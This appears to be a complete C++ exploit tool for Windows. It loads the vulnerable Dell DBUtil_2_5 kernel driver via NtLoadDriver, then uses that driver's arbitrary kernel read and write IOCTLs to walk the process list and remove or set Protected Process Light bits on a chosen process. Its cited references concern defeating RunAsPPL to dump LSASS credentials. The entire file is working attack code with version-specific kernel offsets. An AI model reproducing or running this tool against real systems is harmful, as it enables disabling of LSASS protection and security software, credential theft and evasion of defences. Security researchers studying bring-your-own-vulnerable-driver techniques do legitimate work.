#include <Windows.h>
#include <Psapi.h>
#include <winternl.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <strsafe.h>

#include "popl.hpp"

/**
 * See:
 *  
 *    https://github.com/rapid7/metasploit-framework/pull/15190
 *    https://github.com/RedCursorSecurityConsulting/PPLKiller
 *    https://posts.specterops.io/mimidrv-in-depth-4d273d19e148
 *    https://itm4n.github.io/lsass-runasppl/
 *    https://gorkemkaradeniz.medium.com/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5
 */

namespace
{
    const std::string s_driverHandle("\\\\.\\DBUtil_2_5");
    const std::wstring s_driverServiceName(L"DBUtilDrv2");
    const std::wstring s_driverRegPath(L"System\\CurrentControlSet\\Services\\DBUtilDrv2");

    const uint32_t s_write_ioctl = 0x9b0c1ec8;
    const uint32_t s_read_ioctl = 0x9b0c1ec4;

    struct Offsets
    {
        uint64_t UniqueProcessIdOffset;
        uint64_t ActiveProcessLinksOffset;
        uint64_t SignatureLevelOffset;
    };

    uint64_t readPrimitive(HANDLE p_device, uint64_t p_address)
    {
        uint64_t read_data[4] = { 0, p_address, 0, 0 };
        uint64_t response[4] = { };
        DWORD dwBytesReturned = 0;
        DeviceIoControl(p_device, s_read_ioctl, &read_data, sizeof(read_data), &response, sizeof(response), &dwBytesReturned, 0);
        return response[3];
    }

    void writePrimitive(HANDLE p_device, uint64_t p_address, uint64_t p_data)
    {
        uint64_t write_data[4] = { 0, p_address, 0, p_data };
        uint64_t response[4] = { };
        DWORD bytesReturned = 0;
        DeviceIoControl(p_device, s_write_ioctl, &write_data, sizeof(write_data), &response, sizeof(response), &bytesReturned, 0);
    }

    bool getDeviceHandle(HANDLE& p_handle)
    {
        p_handle = CreateFileA(s_driverHandle.c_str(), GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (INVALID_HANDLE_VALUE == p_handle)
        {
            std::cout << "[!] Failed to get a handle to " << s_driverHandle.c_str() << ": " << GetLastError() << std::endl;
            return false;
        }
        return true;
    }

    uint64_t getKernelBaseAddr()
    {
        DWORD out = 0;
        DWORD nb = 0;
        uint64_t return_value = 0;
        if (EnumDeviceDrivers(NULL, 0, &nb))
        {
            PVOID* base = (PVOID*)malloc(nb);
            if (base != NULL && EnumDeviceDrivers(base, nb, &out))
            {
                return_value = (uint64_t)base[0];
            }

            free(base);
            base = NULL;
        }
        return return_value;
    }

    uint64_t getPsInitialSystemProcessAddress(HANDLE p_device)
    {
        const auto NtoskrnlBaseAddress = getKernelBaseAddr();
        std::cout << "[+] Ntoskrnl base address: " << NtoskrnlBaseAddress << std::endl;

        // Locating PsInitialSystemProcess address
        HMODULE Ntoskrnl = LoadLibraryA("ntoskrnl.exe");
        if (Ntoskrnl == NULL)
        {
            return false;
        }

        uint64_t PsInitialSystemProcessOffset = (uint64_t)(GetProcAddress(Ntoskrnl, "PsInitialSystemProcess")) - (uint64_t)(Ntoskrnl);
        FreeLibrary(Ntoskrnl);

        return readPrimitive(p_device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    }

    uint64_t getTargetProcessAddress(HANDLE p_device, Offsets p_offsets, uint64_t p_psInitialSystemProcessAddress, uint64_t p_targetPID)
    {
        // Find our process in active process list
        uint64_t head = p_psInitialSystemProcessAddress + p_offsets.ActiveProcessLinksOffset;
        uint64_t current = head;

        do
        {
            uint64_t processAddress = current - p_offsets.ActiveProcessLinksOffset;
            uint64_t uniqueProcessId = readPrimitive(p_device, processAddress + p_offsets.UniqueProcessIdOffset);
            if (uniqueProcessId == p_targetPID)
            {
                return current - p_offsets.ActiveProcessLinksOffset;
            }
            current = readPrimitive(p_device, processAddress + p_offsets.ActiveProcessLinksOffset);
        } while (current != head);

        // oh no
        return 0;
    }

    bool changeProcessProtection(uint64_t targetPID, Offsets offsets, bool p_protect)
    {
        HANDLE Device = INVALID_HANDLE_VALUE;
        if (!getDeviceHandle(Device))
        {
            return false;
        }
        std::cout << "[+] Device handle has been obtained @ " << s_driverHandle << std::endl;

        uint64_t PsInitialSystemProcessAddress = getPsInitialSystemProcessAddress(Device);
        if (PsInitialSystemProcessAddress == 0)
        {
            std::cout << "[-] Failed to resolve PsInitilaSystemProcess" << std::endl;
            CloseHandle(Device);
            return false;
        }
        std::cout << "[+] PsInitialSystemProcess address: " << PsInitialSystemProcessAddress << std::endl;


        uint64_t targetProcessAddress = getTargetProcessAddress(Device, offsets, PsInitialSystemProcessAddress, targetPID);
        if (targetProcessAddress == 0)
        {
            std::cout << "[-] Failed to find the target process" << std::endl;
            CloseHandle(Device);
            return false;
        }
        std::cout << "[+] Target process address: " << targetProcessAddress << std::endl;

        // read in the current protection bits, mask them out, and write it back
        uint64_t flags = readPrimitive(Device, targetProcessAddress + offsets.SignatureLevelOffset);
        std::cout << "[+] Current SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer bits (plus 5 bytes): " << flags << std::endl;
        flags = (flags & 0xffffffffff000000);

        if (p_protect)
        {
            // wintcb / protected
            flags = (flags | 0x623f3f);
        }

        std::cout << "[+] Writing flags back as: " << flags << std::endl;
        writePrimitive(Device, targetProcessAddress + offsets.SignatureLevelOffset, flags);

        std::cout << "[+] Done!" << std::endl;
        CloseHandle(Device);
        return true;
    }

    bool getVersionOffsets(Offsets& p_offsets)
    {
        char value[255] = { 0x00 };
        DWORD BufferSize = sizeof(value);
        if (ERROR_SUCCESS != RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", RRF_RT_REG_SZ, NULL, &value, &BufferSize))
        {
            std::cerr << "[-] Couldn't determine the Windows release" << std::endl;
            return false;
        }

        std::cout << "[+] Windows version found: " << value << std::endl;
        switch (atoi(value))
        {
            case 10240: // Gold
                p_offsets.UniqueProcessIdOffset = 0x02e8;
                p_offsets.ActiveProcessLinksOffset = 0x02f0;
                p_offsets.SignatureLevelOffset = 0x06a8;
                return true;
            case 10586: // 2015 update
                p_offsets.UniqueProcessIdOffset = 0x02e8;
                p_offsets.ActiveProcessLinksOffset = 0x02f0;
                p_offsets.SignatureLevelOffset = 0x06b0;
                return true;
            case 14393: // 2016 update
                p_offsets.UniqueProcessIdOffset = 0x02e8;
                p_offsets.ActiveProcessLinksOffset = 0x02f0;
                p_offsets.SignatureLevelOffset = 0x06c8;
                return true;
            case 15063: // April 2017 update
            case 16299: // Fall 2017 update
            case 17134: // April 2018 update
            case 17763: // October 2018 update
                p_offsets.UniqueProcessIdOffset = 0x02e0;
                p_offsets.ActiveProcessLinksOffset = 0x02e8;
                p_offsets.SignatureLevelOffset = 0x06c8;
                return true;
            case 18362: // May 2019 update
            case 18363: // November 2019 update
                p_offsets.UniqueProcessIdOffset = 0x02e8;
                p_offsets.ActiveProcessLinksOffset = 0x02f0;
                p_offsets.SignatureLevelOffset = 0x06f8;
                return true;
            case 19041: // May 2020 update
            case 19042: // October 2020 update
            case 19043: // May 2021 update
            case 19044: // October 2021 update
            case 22000: // Win 11 June/September 2021
                p_offsets.UniqueProcessIdOffset = 0x0440;
                p_offsets.ActiveProcessLinksOffset = 0x0448;
                p_offsets.SignatureLevelOffset = 0x0878;
                return true;
			case 26100: // Win 11 24H2
				p_offsets.UniqueProcessIdOffset = 0x1d0;
				p_offsets.ActiveProcessLinksOffset = 0x1d8;
				p_offsets.SignatureLevelOffset = 0x5f8;
				return true;
            case 26200: // Win 11 25H2
                p_offsets.UniqueProcessIdOffset = 0x1d0;
                p_offsets.ActiveProcessLinksOffset = 0x1d8;
                p_offsets.SignatureLevelOffset = 0x5f8;
                return true;
            default:
                std::cerr << "[-] Unknown offsets for this version. Perhaps add them yourself?" << std::endl;
                break;
        }

        return false;
    }

    bool enableLoadDriverPrivilege()
    {
        HANDLE hToken;
        TOKEN_PRIVILEGES tp;
        LUID luid;

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        {
            std::cout << "[-] OpenProcessToken failed: " << GetLastError() << std::endl;
            return false;
        }

        if (!LookupPrivilegeValueW(NULL, SE_LOAD_DRIVER_NAME, &luid))
        {
            std::cout << "[-] LookupPrivilegeValue failed: " << GetLastError() << std::endl;
            CloseHandle(hToken);
            return false;
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
        {
            std::cout << "[-] AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
            CloseHandle(hToken);
            return false;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        {
            std::cout << "[-] Privilege not assigned" << std::endl;
            CloseHandle(hToken);
            return false;
        }

        CloseHandle(hToken);
        return true;
    }

    bool loadDriverWithNtLoadDriver(const std::wstring& driverPath)
    {
        typedef NTSTATUS(WINAPI* NtLoadDriverFunc)(PUNICODE_STRING DriverServiceName);
        HMODULE hNtdll;
        NtLoadDriverFunc pNtLoadDriver;
        UNICODE_STRING driverServiceName;
        WCHAR registryPath[MAX_PATH];
        NTSTATUS status;
        LONG regResult;
        HKEY hKey;

        if (!enableLoadDriverPrivilege())
        {
            std::cout << "[-] Failed to enable SeLoadDriverPrivilege" << std::endl;
            return false;
        }
        std::cout << "[+] SeLoadDriverPrivilege enabled" << std::endl;

        // Create registry key for driver
        regResult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, s_driverRegPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        if (regResult != ERROR_SUCCESS)
        {
            std::cout << "[-] RegCreateKeyExW failed: " << regResult << std::endl;
            return false;
        }

        // Set ImagePath value (convert to NT path format)
        WCHAR imagePath[MAX_PATH];
        if (StringCchPrintfW(imagePath, MAX_PATH, L"\\??\\%s", driverPath.c_str()) != S_OK)
        {
            std::cout << "[-] StringCchPrintfW failed for image path" << std::endl;
            RegCloseKey(hKey);
            return false;
        }

        regResult = RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ, (BYTE*)imagePath, (DWORD)((wcslen(imagePath) + 1) * sizeof(WCHAR)));
        if (regResult != ERROR_SUCCESS)
        {
            std::cout << "[-] RegSetValueExW failed for ImagePath: " << regResult << std::endl;
            RegCloseKey(hKey);
            return false;
        }

        // Set Type value (kernel driver = 1)
        DWORD driverType = 1;
        regResult = RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&driverType, sizeof(DWORD));
        if (regResult != ERROR_SUCCESS)
        {
            std::cout << "[-] RegSetValueExW failed for Type: " << regResult << std::endl;
            RegCloseKey(hKey);
            return false;
        }

        // Set ErrorControl value
        DWORD errorControl = 1;
        regResult = RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&errorControl, sizeof(DWORD));
        if (regResult != ERROR_SUCCESS)
        {
            std::cout << "[-] RegSetValueExW failed for ErrorControl: " << regResult << std::endl;
            RegCloseKey(hKey);
            return false;
        }

        // Set Start value (demand start = 3)
        DWORD startType = 3;
        regResult = RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&startType, sizeof(DWORD));
        if (regResult != ERROR_SUCCESS)
        {
            std::cout << "[-] RegSetValueExW failed for Start: " << regResult << std::endl;
            RegCloseKey(hKey);
            return false;
        }

        RegCloseKey(hKey);
        std::cout << "[+] Driver registry key created" << std::endl;

        // Load the driver using NtLoadDriver
        hNtdll = LoadLibraryW(L"ntdll.dll");
        if (!hNtdll)
        {
            std::cout << "[-] Failed to load ntdll.dll" << std::endl;
            return false;
        }

        pNtLoadDriver = (NtLoadDriverFunc)GetProcAddress(hNtdll, "NtLoadDriver");
        if (!pNtLoadDriver)
        {
            std::cout << "[-] Failed to get NtLoadDriver address" << std::endl;
            FreeLibrary(hNtdll);
            return false;
        }

        if (StringCchPrintfW(registryPath, MAX_PATH, L"\\Registry\\Machine\\%s", s_driverRegPath.c_str()) != S_OK)
        {
            std::cout << "[-] StringCchPrintfW failed for service registry path" << std::endl;
            FreeLibrary(hNtdll);
            return false;
        }

        RtlInitUnicodeString(&driverServiceName, registryPath);
        status = pNtLoadDriver(&driverServiceName);

        FreeLibrary(hNtdll);

        if (status != 0 && status != (NTSTATUS)0xC0000034 /* STATUS_OBJECT_NAME_NOT_FOUND - Already loaded */)
        {
            std::cout << "[-] NtLoadDriver failed with status: 0x" << std::hex << status << std::dec << std::endl;
            return false;
        }

        if (status == (NTSTATUS)0xC0000034)
        {
            std::cout << "[+] Driver was already loaded" << std::endl;
        }
        else
        {
            std::cout << "[+] Driver loaded successfully" << std::endl;
        }

        return true;
    }

    bool unloadDriver()
    {
        typedef NTSTATUS(WINAPI* NtUnloadDriverFunc)(PUNICODE_STRING DriverServiceName);
        HMODULE hNtdll;
        NtUnloadDriverFunc pNtUnloadDriver;
        UNICODE_STRING driverServiceName;
        WCHAR registryPath[MAX_PATH];
        NTSTATUS status;

        hNtdll = LoadLibraryW(L"ntdll.dll");
        if (!hNtdll)
        {
            std::cout << "[-] Failed to load ntdll.dll" << std::endl;
            return false;
        }

        pNtUnloadDriver = (NtUnloadDriverFunc)GetProcAddress(hNtdll, "NtUnloadDriver");
        if (!pNtUnloadDriver)
        {
            std::cout << "[-] Failed to get NtUnloadDriver address" << std::endl;
            FreeLibrary(hNtdll);
            return false;
        }

        if (StringCchPrintfW(registryPath, MAX_PATH, L"\\Registry\\Machine\\%s", s_driverRegPath.c_str()) != S_OK)
        {
            std::cout << "[-] StringCchPrintfW failed for service registry path" << std::endl;
            FreeLibrary(hNtdll);
            return false;
        }

        RtlInitUnicodeString(&driverServiceName, registryPath);
        status = pNtUnloadDriver(&driverServiceName);

        FreeLibrary(hNtdll);

        if (status != 0 && status != (NTSTATUS)0xC0000034 /* Not loaded */)
        {
            std::cout << "[-] NtUnloadDriver failed with status: 0x" << std::hex << status << std::dec << std::endl;
            return false;
        }

        std::cout << "[+] Driver unloaded successfully" << std::endl;

        // Clean up registry key
        LONG regResult = RegDeleteKeyW(HKEY_LOCAL_MACHINE, s_driverRegPath.c_str());
        if (regResult == ERROR_SUCCESS)
        {
            std::cout << "[+] Driver registry key deleted" << std::endl;
        }

        return true;
    }
}

int main(int p_argc, char* p_argv[])
{
    popl::OptionParser op("Allowed options");
    auto help_option = op.add<popl::Switch>("h", "help", "produce help message");
    auto pid_option = op.add<popl::Value<int>, popl::Attribute::required>("p", "pid", "the target pid");
    auto enable_option = op.add<popl::Value<bool>, popl::Attribute::required>("e", "enable", "enable memory protection (0 or 1)");
    auto driver_path = op.add<popl::Value<std::string>, popl::Attribute::required>("d", "driver", "The full path to the driver .sys file (e.g., C:\\path\\to\\dbutildrv2.sys)");

    try
    {
        op.parse(p_argc, p_argv);
    }
    catch (std::exception& e)
    {
        std::cout << e.what() << std::endl;
        std::cout << op << std::endl;
        return EXIT_FAILURE;
    }

    if (help_option->is_set())
    {
        std::cout << op << std::endl;
        return EXIT_SUCCESS;
    }

    std::cout << "[+] User provided pid: " << pid_option->value() << std::endl;
    std::cout << "[+] User provided driver path: " << driver_path->value() << std::endl;

    // Convert driver path to wide string and get absolute path
    std::filesystem::path driverFilePath(driver_path->value());
    if (!std::filesystem::exists(driverFilePath))
    {
        std::cerr << "[!] Could not find the driver file: " << driver_path->value() << std::endl;
        return EXIT_FAILURE;
    }

    // Get absolute path for the driver
    std::filesystem::path absoluteDriverPath = std::filesystem::absolute(driverFilePath);
    std::wstring driverPathW = absoluteDriverPath.wstring();
    std::wcout << L"[+] Absolute driver path: " << driverPathW << std::endl;

    Offsets offsets = { 0, 0, 0 };
    if (!getVersionOffsets(offsets))
    {
        return EXIT_FAILURE;
    }

    std::cout << "[+] Using offsets: " << std::hex << std::endl;
    std::cout << "\tUniqueProcessIdOffset = 0x" << offsets.UniqueProcessIdOffset << std::endl;
    std::cout << "\tActiveProcessLinkOffset = 0x" << offsets.ActiveProcessLinksOffset << std::endl;
    std::cout << "\tSignatureLevelOffset = 0x" << offsets.SignatureLevelOffset << std::endl;

    // Load driver using NtLoadDriver
    std::cout << "[+] Attempting driver load via NtLoadDriver..." << std::endl;
    if (!loadDriverWithNtLoadDriver(driverPathW))
    {
        std::cerr << "[!] Failed to load driver" << std::endl;
        return EXIT_FAILURE;
    }

    changeProcessProtection(pid_option->value(), offsets, enable_option->value());
    
    // Unload driver
    unloadDriver();

    std::cout << "[!] Clean exit! o7" << std::endl;

    return EXIT_SUCCESS;
}
